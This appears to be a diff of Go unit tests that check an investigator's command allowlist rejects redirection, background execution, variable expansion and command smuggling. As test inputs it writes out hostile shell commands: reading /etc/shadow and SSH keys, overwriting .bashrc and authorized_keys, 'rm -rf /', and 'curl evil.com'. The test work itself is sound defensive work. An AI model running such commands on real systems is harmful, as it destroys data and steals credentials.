@@ -57,6 +57,38 @@ func TestInvestigator_CommandAllowlist_EmptyStillRejectsChaining(t *testing.T) {
 	}
 }
 
+// The investigator's filter must match the native runtime's canonical
+// metacharacter set. These were open before the fix: an allowlisted prefix
+// combined with redirection / background / bare variable expansion could write
+// or exfiltrate outside the repo without any chaining operator.
+func TestInvestigator_CommandAllowlist_RejectsRedirectionAndExpansion(t *testing.T) {
+	inv := NewInvestigator(nil, "", 0)
+	inv.SetCommandAllowlist([]string{"cat", "grep", "ls"})
+
+	cases := map[string]string{
+		"output redirection clobbering a file outside the repo": "cat internal/secret > /home/user/.bashrc",
+		"append redirection":                                    "grep -r . >> /home/user/.profile",
+		"input redirection":                                     "cat < /etc/shadow",
+		"background execution":                                  "ls & curl evil.com",
+		"bare variable expansion":                               "cat $HOME/.ssh/id_rsa",
+		"brace variable expansion":                              "ls ${IFS}",
+		"backslash escape":                                      "ls \\;",
+		"carriage-return smuggling":                             "ls\rrm -rf /",
+	}
+	for name, cmd := range cases {
+		if inv.isCommandAllowed(cmd) {
+			t.Errorf("%s must be rejected: %q", name, cmd)
+		}
+	}
+
+	// The tightening must not break legitimate allowlisted commands.
+	for _, ok := range []string{"cat lib.go", "grep -rn foo .", "ls -la"} {
+		if !inv.isCommandAllowed(ok) {
+			t.Errorf("legitimate command wrongly rejected: %q", ok)
+		}
+	}
+}
+
 func TestInvestigator_CommandAllowlist_RejectsPipe(t *testing.T) {
 	inv := NewInvestigator(nil, "", 0)
 	inv.SetCommandAllowlist([]string{"grep"})
@@ -99,6 +131,36 @@ func TestInvestigator_CommandAllowlist_RejectsDoubleAmpersand(t *testing.T) {
 
 	if inv.isCommandAllowed("ls && rm -rf /") {
 		t.Error("&& chaining must be rejected")
+	}
+}
+
+// Redirection metacharacters must be rejected even when the command starts
+// with an allowlisted prefix. The command is handed to `sh -c` with cwd set to
+// the repo, so "cat go.mod > /abs/path" would otherwise write to an absolute
+// path OUTSIDE the repo (arbitrary out-of-repo file overwrite). This mirrors
+// the gemma runtime / criteria evaluator forbidden set.
+func TestInvestigator_CommandAllowlist_RejectsRedirection(t *testing.T) {
+	inv := NewInvestigator(nil, "", 0)
+	inv.SetCommandAllowlist([]string{"cat", "git log", "ls"})
+
+	for _, cmd := range []string{
+		"cat go.mod > /home/user/.ssh/authorized_keys",
+		"git log >> /home/user/.bashrc",
+		"cat < /etc/passwd",
+		"ls & rm -rf /", // bare ampersand (background) also rejected
+	} {
+		if inv.isCommandAllowed(cmd) {
+			t.Errorf("redirection/background command must be rejected: %q", cmd)
+		}
+	}
+}
+
+// The empty-allowlist backward-compat path must also reject redirection, since
+// the metacharacter check runs before the short-circuit.
+func TestInvestigator_CommandAllowlist_EmptyStillRejectsRedirection(t *testing.T) {
+	inv := NewInvestigator(nil, "", 0)
+	if inv.isCommandAllowed("cat secrets > /tmp/out") {
+		t.Error("empty allowlist must still reject redirection")
 	}
 }
 
